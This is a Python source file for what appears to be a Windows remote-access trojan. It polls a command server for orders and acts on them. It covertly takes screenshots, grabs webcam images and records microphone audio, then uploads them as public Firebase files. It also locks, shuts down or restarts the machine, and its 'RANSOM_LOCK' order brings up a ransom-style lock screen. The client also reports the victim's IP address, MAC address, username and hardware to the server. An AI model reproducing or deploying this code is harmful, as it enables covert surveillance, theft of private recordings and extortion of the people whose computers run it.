import ctypes
import os
import platform
import time
from ctypes import *
from datetime import datetime
from urllib.error import URLError
from urllib.request import urlopen
from uuid import getnode as get_mac

import cv2 as cv
import psutil
import requests
import sounddevice as sd
import soundfile as sf
import wmi
from firebase_admin import storage
from PIL import ImageGrab

import config
from API import CAPI
from lock_the_sky import LOCK_THE_SKY
from upload_files import upload_the_sky


class PCControl:
    def __init__(self):
        self.connect = CAPI()
        self.upload = upload_the_sky()
        self.lock = LOCK_THE_SKY()
        self.camera = False
        self.mic = False
        self.battery = False

    def service(self, key):
        while True:
            time.sleep(2)
            if not self.connect.check_for_new_orders(key):
                print("No Orders")
            else:
                print("Orders")
                order = self.connect.check_for_new_orders(key)['order']
                order_id = self.connect.check_for_new_orders(key)['_id']
                if order == "INSTANT_SCREEN":
                    self.screen_shot(order, order_id, key)
                    continue
                if order == "INSTANT_LOCK":
                    self.lock_my_pc(order, order_id, key)
                    continue
                if order == "EYE_ON_THE_SKY":
                    self.capture_cam(order, order_id, key)
                    continue
                if order == "EAR_ON_THE_SKY":
                    self.mic_capture(order, order_id, key)
                    continue
                if order == "RANSOM_LOCK":
                    self.lock_the_sky(order, order_id, key)
                    continue
                if order == "SHUTDOWN_THE_SKY":
                    self.power_control(order, order_id, key)
                    continue
                if order == "RESTART_THE_SKY":
                    self.power_control(order, order_id, key)
                    continue

    def lock_the_sky(self, order, order_id, key):
        self.connect.mark_order_as_done(order, order_id, key)
        c = config.PCConfig()
        if c.lock_status_config(lock_status=True, order_type="locked"):
            self.lock.ui(key)
        else:
            print("Error Occurrence")
        self.get_pc_info(key)

    def screen_shot(self, order, order_id, key):
        try:
            im = ImageGrab.grab()
            filename = self.rename_file("ss", key)
            im.save(filename)
            media = self.upload_to_universe(filename)
            os.remove(filename)
            self.connect.mark_order_as_done(order, order_id, key, media)

        except Exception as e:
            self.connect.mark_order_as_done(order, order_id, key)
        self.get_pc_info(key)

    def lock_my_pc(self, order, order_id, key):
        ctypes.windll.user32.LockWorkStation()
        self.connect.mark_order_as_done(order, order_id, key)
        self.get_pc_info(key)

    def power_control(self, order, order_id, key):
        if order == "SHUTDOWN_THE_SKY":
            os.system("shutdown -s -t 5")
            self.connect.mark_order_as_done(order, order_id, key)
        if order == "RESTART_THE_SKY":
            os.system("shutdown -r -t 5")
            self.connect.mark_order_as_done(order, order_id, key)
        self.get_pc_info(key)

    def mic_capture(self, order, order_id, key):
        duration = 65  # seconds
        recording = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
        sd.wait()
        filename = self.rename_file("record", key)
        sf.write(filename, data=recording, samplerate=44100)
        media = self.upload_to_universe(filename)
        os.remove(filename)
        self.connect.mark_order_as_done(order, order_id, key, media)
        self.get_pc_info(key)

    def capture_cam(self, order, order_id, key):
        media = None
        try:
            camera_port = 0
            camera = cv.VideoCapture(camera_port)
            return_value, image = camera.read()
            filename = self.rename_file("cam", key)
            cv.imwrite(filename, image)
            media = self.upload_to_universe(filename)
            os.remove(filename)
            camera.release()
            cv.destroyAllWindows()
        except Exception as e:
            # Submit to server no cam
            print(e)
        self.connect.mark_order_as_done(order, order_id, key, media)
        self.get_pc_info(key)

    def get_pc_info(self, key):
        computer = wmi.WMI()
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576

        platform_user = platform.uname()[0]
        username = platform.uname()[1]

        cap = cv.VideoCapture(0)
        if cap is None or not cap.isOpened():
            pass
        else:
            self.camera = True
        winmm = windll.winmm
        if not winmm.waveInGetNumDevs() == 0:
            self.mic = True
        else:
            self.mic = False
        ip = requests.get('https://api.ipify.org').text
        try:

            if psutil.sensors_battery():
                self.battery = True
            else:
                self.battery = False

        except AttributeError:
            self.battery = False
        # submit to server
        data = {
            "platform": platform_user,
            "username": username,
            "cpu": str(proc_info.Name),
            "gpu": str(gpu_info.Name),
            "ip": ip,
            "key": key,
            "system": str(os_name),
            "cam": self.camera,
            "mic": self.mic,
            "ram": str(system_ram),
            "mac_address": str(get_mac()),
            "battery": self.battery,
            "battery_percentage": "none for now"
        }
        self.connect.submit_sky_info(data)
        # self.connect.mark_order_as_done(order, order_id, key)

    @staticmethod
    def rename_file(order_type, key):
        now = datetime.now()
        timestamp = datetime.timestamp(now)
        if order_type == "record":
            record = "record_" + str(timestamp) + "_" + str(key) + ".wav"
            return record
        if order_type == "ss":
            ss = "ss_" + str(timestamp) + "_" + str(key) + ".png"
            return ss
        if order_type == "cam":
            cam = "cam_" + str(timestamp) + "_" + str(key) + ".png"
            return cam

    def upload_to_universe(self, filename):
        try:
            urlopen('http://216.58.192.142', timeout=1)
            try:
                self.upload.init_firebase()
                bucket = storage.bucket()
                blob = bucket.blob(filename)
                blob.upload_from_filename(filename)
                blob.make_public()
                return blob.public_url
            except ConnectionAbortedError as e:
                print("Oh, ConnectionAbortedError" + str(e))
                self.upload.init_firebase()
                bucket = storage.bucket()
                blob = bucket.blob(filename)
                blob.upload_from_filename(filename)
                blob.make_public()
                return blob.public_url
        except URLError as err:
            print("Oh," + str(err))
